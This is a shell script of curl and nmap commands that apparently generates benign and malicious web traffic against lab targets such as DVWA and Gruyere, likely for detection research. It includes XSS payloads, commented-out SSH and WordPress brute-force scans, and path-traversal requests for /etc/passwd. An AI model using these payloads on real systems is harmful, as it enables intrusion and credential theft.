curl -i -s -k --interface $U4i -X $'GET' \
    -H $'Host: lsa' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://lsa/' \
    $'http://lsa/Backnode_files/jquery.js'
curl -i -s -k --interface $U4i -X $'GET' \
    -H $'Host: lsa' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://lsa/' \
    $'http://lsa/Backnode_files/jquery-ui.js'
curl -i -s -k --interface $U4i -X $'GET' \
    -H $'Host: lsa' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://lsa/' \
    $'http://lsa/Backnode_files/pageable.js'
curl -i -s -k --interface $U4i -X $'GET' \
    -H $'Host: lsa' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://lsa/' \
    $'http://lsa/Backnode_files/front-end.js'
curl -i -s -k --interface $U4i -X $'GET' \
    -H $'Host: lsa' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: image/webp,*/*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://lsa/' \
    $'http://lsa/libs/templates/silex-templates/online-service/assets/background_header.jpg'
curl -i -s -k --interface $U4i -X $'GET' \
    -H $'Host: lsa' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: image/webp,*/*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' \
    $'http://lsa/favicon.ico'


curl -i -s -k --interface $U2i -X $'GET' \
    -H $'Host: 192.168.56.108' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \
    $'http://192.168.56.108/'



curl -i -s -k --interface $U1i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/dvwa/vulnerabilities/sqli/?id=admin&Submit=Submit' -H $'Cookie: security=low; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'security=low; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5' \
    $'http://192.168.56.113/dvwa/vulnerabilities/sqli/?id=1234&Submit=Submit'



curl -i -s -k --inetrface $U5i -X $'GET' \
    -H $'Host: 192.168.56.108' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.108/' -H $'Upgrade-Insecure-Requests: 1' \
    $'http://192.168.56.108/twiki/'


curl -i -s -k --interface $U1i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/1142014131/' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600' \
    $'http://192.168.56.113/1142014131/login'
curl -i -s -k --interface $U1i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/1142014131/newaccount.gtl' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=' \
    $'http://192.168.56.113/1142014131/saveprofile?action=new&uid=WisconsinCheddar&pw=potato&is_author=True'
curl -i -s -k --interface $U1i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/1142014131/saveprofile?action=new&uid=WisconsinCheddar&pw=potato&is_author=True' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=2308874|WisconsinCheddar||author' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=2308874|WisconsinCheddar||author' \
    $'http://192.168.56.113/1142014131/'

















curl -i -s -k --interface $U1i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/1142014131/' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=2308874|WisconsinCheddar||author' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=2308874|WisconsinCheddar||author' \
    $'http://192.168.56.113/1142014131/newsnippet.gtl'

curl -i -s -k --interface $U1i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/1142014131/newsnippet.gtl' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=2308874|WisconsinCheddar||author' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=2308874|WisconsinCheddar||author' \
    $'http://192.168.56.113/1142014131/newsnippet2?snippet=Hey+everyone%21%21%21%21'
curl -i -s -k --interface $U1i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://192.168.56.113/1142014131/newsnippet.gtl' -H $'Connection: close' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=2308874|WisconsinCheddar||author' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=2308874|WisconsinCheddar||author' \
    $'http://192.168.56.113/1142014131/snippets.gtl'


curl -i -s -k --interface $A1i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/1142014131/login' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=' \
    $'http://192.168.56.113/1142014131/login?uid=minionlord&pw=minionlord'
sleep 8
curl -i -s -k --interface $A1i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/1142014131/newsnippet.gtl' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=11314643|minionlord||author' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=11314643|minionlord||author' \
    $'http://192.168.56.113/1142014131/newsnippet2?snippet=%3Cimg+src%3Derr+onerror%3Dalert%281%29+%2F%3E'
sleep 2
curl -i -s -k --interface $A1i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/1142014131/newsnippet.gtl' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=11314643|minionlord||author' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=11314643|minionlord||author' \
    $'http://192.168.56.113/1142014131/newsnippet2?snippet=%3Cimg+src%3D%22troolll%22+onerror%3D%27minion+%3D+new+XMLHttpRequest'













curl -i -s -k --interface $U2i -X $'GET' \
    -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Upgrade-Insecure-Requests: 1' -H $'Pragma: no-cache' -H $'Cache-Control: no-cache' \
    -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
    $'http://zc2/'
curl -i -s -k --interface $U2i -X $'GET' \
    -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://zc2/' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Pragma: no-cache' -H $'Cache-Control: no-cache' \
    -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
    $'http://zc2/vendor/jquery/jquery.min.js'
curl -i -s -k --interface $U2i -X $'GET' \
    -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://zc2/' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Pragma: no-cache' -H $'Cache-Control: no-cache' \
    -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
    $'http://zc2/vendor/bootstrap/js/bootstrap.min.js'
curl -i -s -k --interface $U2i -X $'GET' \
    -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://zc2/' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Pragma: no-cache' -H $'Cache-Control: no-cache' \
    -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
    $'http://zc2/vendor/scrollreveal/scrollreveal.min.js'
curl -i -s -k --interface $U2i -X $'GET' \
    -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://zc2/' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Pragma: no-cache' -H $'Cache-Control: no-cache' \
    -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
    $'http://zc2/vendor/magnific-popup/jquery.magnific-popup.min.js'
curl -i -s -k --interface $U2i -X $'GET' \
    -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://zc2/' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Pragma: no-cache' -H $'Cache-Control: no-cache' \
    -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
    $'http://zc2/js/creative.min.js'
curl -i -s -k --interface $U2i -X $'GET' \
    -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: image/webp,*/*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Pragma: no-cache' -H $'Cache-Control: no-cache' \
    -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
    $'http://zc2/favicon.ico'
sleep 5
curl -i -s -k --interface $U4i -X $'GET' \
    -H $'Host: 192.168.56.108' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \
    $'http://192.168.56.108/'



curl -i -s -k --interface $U2i -X $'GET' \
    -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://zc2/' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
    $'http://zc2/view.php?page=tools.html'
sleep 10
curl -i -s -k --interface $U2i -X $'GET' \
    -H $'Host: 192.168.56.108' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.108/' -H $'Cookie: PHPSESSID=1aade7ff37fe2c2a50c3adf7dc2a9837' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'PHPSESSID=1aade7ff37fe2c2a50c3adf7dc2a9837' \
    $'http://192.168.56.108/phpMyAdmin/'








curl -i -s -k --interface $U4i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600' \
    $'http://192.168.56.113/gruyere/'
curl -i -s -k --interface $U4i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://192.168.56.113/' -H $'Connection: close' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600' \
    $'http://192.168.56.113/1142014131/'
curl -i -s -k --interface $U4i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/1142014131/' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600' \
    -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600' \
    $'http://192.168.56.113/1142014131/lib.js'




















####### malicious traffic


# LSA


# nmap -n --script http-wordpress-brute --script-args 'http-wordpress-brute.uri=/wordpress/wp-admin,userdb=/usr/share/nmap/nselib/data/users1.lst,passdb=/usr/share/nmap/nselib/data/rockyou1000.lst' $LSA -e $A1i -S $A1
# nmap

# #SSH brute force
# nmap -n --script ssh-brute --script-args 'userdb=/usr/share/nmap/nselib/data/users1.lst,passdb=/usr/share/nmap/nselib/data/rockyou1000.lst' $LSA -e $A1i -S A1 &>/dev/null &





# ZC2

# nmap
# nmap dirb


# curl -i -s -k -X $'GET' \
#     -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Upgrade-Insecure-Requests: 1' \
#     -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
#     $'http://zc2/view.php?page=../../../../etc/passwd'
# curl -i -s -k -X $'GET' \
#     -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Cookie: pla3412=admin; pla3412_salt=aoikrcnbndk; PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Upgrade-Insecure-Requests: 1' \
#     -b $'pla3412=admin; pla3412_salt=aoikrcnbndk; PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
#     $'http://zc2/dbadmin/'
# curl -i -s -k -X $'GET' \
#     -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://zc2/dbadmin/' -H $'Cookie: pla3412=admin; pla3412_salt=aoikrcnbndk; PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Upgrade-Insecure-Requests: 1' \
#     -b $'pla3412=admin; pla3412_salt=aoikrcnbndk; PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
#     $'http://zc2/dbadmin/test_db.php'
# curl -i -s -k -X $'GET' \
#     -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Upgrade-Insecure-Requests: 1' -H $'Cache-Control: max-age=0' \
#     -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
#     $'http://zc2/view.php?page=../../../../../usr/databases/hack.php'





# MSF

# nmap
# nmap dirb
# #brute force http this page
# curl -i -s -k -X $'POST' \
#     -H $'Host: 192.168.56.108' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 36' -H $'Origin: http://192.168.56.108' -H $'Connection: close' -H $'Referer: http://192.168.56.108/dvwa/login.php' -H $'Cookie: security=high; PHPSESSID=1aade7ff37fe2c2a50c3adf7dc2a9837' -H $'Upgrade-Insecure-Requests: 1' \
#     -b $'security=high; PHPSESSID=1aade7ff37fe2c2a50c3adf7dc2a9837' \
#     --data-binary $'username=admin&password=&Login=Login' \
#     $'http://192.168.56.108/dvwa/login.php'


# curl -i -s -k -X $'GET' \
#     -H $'Host: 192.168.56.108' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.108/dvwa/vulnerabilities/sqli_blind/' -H $'Cookie: security=high; PHPSESSID=1aade7ff37fe2c2a50c3adf7dc2a9837' -H $'Upgrade-Insecure-Requests: 1' \
#     -b $'security=high; PHPSESSID=1aade7ff37fe2c2a50c3adf7dc2a9837' \
#     $'http://192.168.56.108/dvwa/vulnerabilities/fi/?page=../../../../../../../etc/passwd'






# # OWASP


# #directory enumeration
# nmap -sV --script=http-enum $OWASP -e $A1i -S $A1 &>/dev/null &


# # SQLI
# curl -i -s -k -X $'GET' \
